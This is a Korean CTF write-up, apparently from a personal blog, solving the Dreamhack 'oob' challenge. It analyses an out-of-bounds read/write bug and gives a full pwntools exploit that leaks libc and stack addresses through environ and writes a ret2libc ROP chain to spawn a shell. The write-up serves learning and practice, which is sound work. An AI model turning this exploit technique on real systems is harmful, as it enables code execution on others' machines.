---
title: "[DREAMHACK] oob writeup"
date: 2026-02-01 14:53:50
categories: Essay
tags: [writeup]
---

# 정적 분석(대충 그럼)

**사용한 도커 이미지**: `63um3um/pwn-ubuntu:22.04`
```
docker run --rm -d -t --privileged -v $PWD:/root/pwn --name=u2204 63um3um/pwn-ubuntu:22.04
docker exec -it -u root u2204 zsh
```
`root/`에 `pwndbg` 있어서 바로 설치

**파일 정보**:
```
oob: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked
GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
...
000000000000127c T main
00000000000013dc T _fini
0000000000002000 R _IO_stdin_used
000000000000204c r __GNU_EH_FRAME_HDR
0000000000002178 r __FRAME_END__
0000000000003d90 d __frame_dummy_init_array_entry
0000000000003d98 d __do_global_dtors_aux_fini_array_entry
0000000000003da0 d _DYNAMIC
0000000000003f90 d _GLOBAL_OFFSET_TABLE_
0000000000004000 D __data_start
0000000000004000 W data_start
0000000000004008 D __dso_handle
0000000000004010 D oob
000000000000401e B __bss_start
000000000000401e D _edata
0000000000004020 D __TMC_END__
0000000000004020 B stdout@GLIBC_2.2.5
0000000000004030 B stdin@GLIBC_2.2.5
...
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

`patchelf`를 사용해서 환경을 원격과 최대한 비슷하게 구성함
```
patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./oob
patchelf --replace-needed libc.so.6 ./libc.so.6 ./oob
```

(libc 파일의 경우 문제에서 제공한 도커파일을 이용해 만든 컨테이너에서 바로 빼왔습니다)

기본적인 건 이렇게 해놨고, 지금 생각해보니 스켈레톤 코드 양식을 안 만들어뒀더라고요..
그래서 이번 문제를 풀면서 따로 몇 개를 작성했습니다

디스어셈 결과의 길이가 제게는 막대한 지라, ida로 분석을 마저 해보겠습니다.

```c
...
int menu()
{
  puts("1. read");
  puts("2. write");
  puts("3. exit");
  return printf("> ");
}
...
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-14h] BYREF
  _QWORD v5[2]; // [rsp+10h] [rbp-10h] BYREF

  v5[1] = __readfsqword(0x28u);
  initialize(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        __isoc99_scanf("%d", &v4);
        if ( v4 != 1 )
          break;
        printf("offset: ");
        __isoc99_scanf("%lld", v5);
        printf("%c\n", (unsigned int)oob[v5[0]]);
      }
      if ( v4 != 2 )
        break;
      printf("offset: ");
      __isoc99_scanf("%lld", v5);
      printf("value: ");
      getchar();
      __isoc99_scanf("%lld", &oob[v5[0]]);
    }
    if ( v4 == 3 )
      break;
    puts("invalid choice");
  }
  return 0;
}
```

어... 의사코드가 맞긴 한데, 좀 보는 데 불편한 감이 없잖아 있습니다.
ida 기능을 잘 안... 쓰는 게 아니라 그냥 안 쓰는 편이라 변수명만 살짝 바꾸고 봤습니다.

기능은 다음과 같습니다:

- 1. `read`: 원하는 위치에서 `1바이트`를 읽어 출력합니다.
- 2. `write`: 원하는 위치에 값을 씁니다..
- 3. `exit`: 나가는 거

위치의 기준은 `oob`입니다, 아까 `nm` 명령어로 본 전역 변수 중에 있습니다.
문제의 제목, 변수명에서 **Out Of Bound** 취약점을 이용해 익스플로잇 가능하단 점을 확인 가능합니다.

읽을 만한 값...은 아마 `stdout`, `stdin`이라 생각됩니다.
여기 주소 읽은 뒤 `libc base` 구하면 될 것 같네요. `stdout`이 `libc` 쪽에 위치한 `_IO_2_1_stdout_`을 가리키는 포인터...거든요

얘는 `system`이라던가 바이너리에 가젯이 마땅히 없는 경우에 `libc`에서 가젯 빌려올 때 쓸 예정입니다.

# 동적 분석 / 익스플로잇

이러다가 생각이 멈췄습니다. 리턴 주소 덮어야 하는데, 어떻게 덮을까...가 갑자기 떠올랐거든요?
리턴 주소, 그 친구는 분명 `main`의 프레임에 있습니다. 문제는 제가 공부를 너무 안 한 나머지 이걸 어디서 보는지조차 몰랐다는 거죠..

다행히 이전에 제가 사용한 코드에 우연히 주석으로 프레임 정보를 확인하는 내용을 기록해 두었더라고요..? 운이 좋아서 그걸로 `saved rip`값 확인, 그리고 이 값을 어디에서 가리키고 있는지 보면 된다는 걸 다시 떠올렸습니다..

```
pwndbg> i frame

Stack level 0, frame at 0x7fffffffe500:

 rip = 0x55555555527c in main; saved rip = 0x7ffff7c29d90

 called by frame at 0x7fffffffe5a0

 Arglist at 0x7fffffffe4f0, args: 

 Locals at 0x7fffffffe4f0, Previous frame's sp is 0x7fffffffe500

 Saved registers:

  rip at 0x7fffffffe4f8
```

**RET**의 위치(저장된 스택 주소??)는 `0x7fffffffe4f8`입니다.

그냥 `RET`이랑 `oob` 위치 뺄셈해서 오프셋으로 쓰면 안되나, 그런 질문이 머릿속에 잠깐 떴는데
이건 영역 줄다리기 싸움 하는 것도 아니고 말도 안되는 얘기입니다..

`PIE`는 `PIE`대로, `LIBC`는 `LIBC`대로 매핑이 랜덤하게 달라지기 때문이죠..
참 이런 바보같은 생각은 왜 떠올랐는지 모르겠네요..

이 질문 덕분에 `environ`의 존재를 떠올렸습니다.
어찌보면 좋은 거죠..?

얘가 `LIBC` 영역에 존재하는데, 가리키는 게 스택 주소가 담겨서, 이 내용을 사용해 `RET`의 위치를 알아내는 겁니다.

이제 `oob`와 `RET`의 거리차를 알아내면 되는데, 전역 변수였습니다. 그래서...
아까 그 질문 때문인가, 이번에는 그럼 `RET`과 `oob`의 오프셋을 왜 구하냐 생각이 든 거죠..
이걸 오프셋이라고 불러야 하나.. 아닙니다.. 아마 아닐 거에요.. 고정적이지 않으니까
아. 얘는 그런 문제가 아니네요;;

그냥 떨어진 거리 찾기만 하면 되는 거라 ㅋㅋ
잠깐 바보같은 생각을 했던 것 같습니다

뭐 내용은 얼추 정리된 것 같으니, 코드를 짜봤습니다.

```python
'''
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
/lib/x86_64-linux-gnu/libc.so.6
'''

'''
0000000000004010 D oob
000000000000401e B __bss_start
000000000000401e D _edata
0000000000004020 D __TMC_END__
0000000000004020 B stdout@GLIBC_2.2.5
0000000000004030 B stdin@GLIBC_2.2.5
0000000000004038 b completed.0
0000000000004040 B _end
'''

# oob + 0x10: stdout
# GOT(global offset table): 0x3f90
# oob: 0x4010
# dist: 0x80:(128)

from pwn import *

context.binary = elf = ELF('./oob')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 21370".split()

libc = elf.libc

def slog(n, a): return success(': '.join([n, hex(a)]))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6')
else:
    p = process()

def read(offset):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'offset: ', str(offset).encode())

def write(offset, v):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'offset: ', str(offset).encode())
    p.sendlineafter(b'value: ', str(v).encode())

def leak(offset):
    l = 0
    for i in range(8):
        read(offset+i)
        out = p.recvline().strip()
        byte = 0 if not out else out[0]

        l |= (byte << (8 * i))
    
    return l

stdout = 0
stdout = leak(16)

got = 0
got = leak(-128)
lb = stdout - libc.sym["_IO_2_1_stdout_"]

oob = 0
oob = leak(-8) + 0x8
pie_base = oob - 0x4010

system = lb + libc.sym["system"]
environ = lb + libc.sym["__environ"]

slog("stdout", stdout)
slog("libc_base", lb)
slog("GOT", got)
slog("oob", oob)
slog("pie_base", pie_base)
slog("environ", environ)

# environ2ret
dist = environ - oob

stack = leak(dist)
slog("stack", stack)

ret = stack - 288
slog("ret", ret)

oob2ret = ret - oob
slog("oob2ret", oob2ret)

# gdb.attach(p)
# pause()

rop = ROP(libc)
pop_rdi = lb + rop.find_gadget(["pop rdi", "ret"])[0]
binsh = lb + next(libc.search(b'/bin/sh\x00'))
system = lb + libc.sym["system"]
ret_g = lb + rop.find_gadget(["ret"])[0]

write(oob2ret, pop_rdi)
write(oob2ret+0x8, binsh)
write(oob2ret+0x10, ret_g)
write(oob2ret+0x18, system)

p.interactive()
```

+) 번외
`FSOP`가 가능하지 않을까.. 생각했는데, 지식이 거의 없는 편이라 일단 풀고 다른 풀이를 찾아보며 `FSOP` 어케 했을지 공부하기로 했습니다.